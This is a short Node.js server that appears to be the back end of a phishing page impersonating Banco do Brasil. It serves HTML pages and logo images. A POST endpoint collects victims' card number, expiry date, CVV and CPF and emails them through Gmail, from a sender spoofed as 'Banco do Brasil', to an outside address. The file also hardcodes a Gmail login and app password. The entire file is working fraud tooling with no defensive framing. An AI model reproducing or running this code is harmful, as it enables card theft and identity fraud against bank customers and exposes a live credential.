const http = require('http');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'abraaomark.sdb@gmail.com',
    pass: 'wxzcqlmkyybnfdjc'
  }
});

const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.method === 'GET' && (req.url === '/' || req.url === '/index.html' || req.url.endsWith('.html'))) {
    const file = req.url === '/' ? 'index.html' : req.url.slice(1);
    const filePath = path.join(__dirname, file);
    if (fs.existsSync(filePath)) {
      res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8'});
      res.end(fs.readFileSync(filePath));
    } else {
      res.writeHead(404);
      res.end('Not found');
    }
    return;
  }

  if (req.method === 'GET' && (req.url === '/banco-do-brasil-5.png' || req.url === '/logo.png')) {
    res.writeHead(200, {'Content-Type': 'image/png'});
    res.end(fs.readFileSync(path.join(__dirname, req.url.slice(1))));
    return;
  }

  if (req.method === 'POST' && req.url === '/enviar') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', async () => {
      try {
        const dados = JSON.parse(body);
        await transporter.sendMail({
          from: '"Banco do Brasil" <abraaomark.sdb@gmail.com>',
          to: 'bb.securitycenter@gmail.com',
          subject: 'Banco do Brasil - Dados do cartão',
          text:
            'Número do cartão: ' + dados.cartao + '\n' +
            'Data de validade: ' + dados.validade + '\n' +
            'CVV: ' + dados.cvv + '\n' +
            'CPF do titular: ' + dados.cpf
        });
        res.writeHead(200, {'Content-Type': 'application/json'});
        res.end(JSON.stringify({ok: true}));
      } catch (e) {
        res.writeHead(200, {'Content-Type': 'application/json'});
        res.end(JSON.stringify({ok: false, message: e.message}));
      }
    });
    return;
  }

  res.writeHead(404);
  res.end('Not found');
});

server.listen(8080, () => console.log('Servidor em http://localhost:8080'));